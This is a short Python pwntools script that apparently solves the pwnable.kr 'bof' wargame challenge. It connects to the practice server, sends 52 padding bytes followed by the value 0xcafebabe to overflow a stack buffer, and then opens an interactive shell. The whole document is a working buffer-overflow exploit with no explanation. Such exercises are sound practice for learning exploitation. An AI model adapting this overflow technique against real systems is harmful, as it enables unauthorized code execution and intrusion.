from pwn import *

r = remote('pwnable.kr', 9000)
shellcode = '\xbe\xba\xfe\xca'
r.send("B"*52 + shellcode + "\n")
r.interactive()
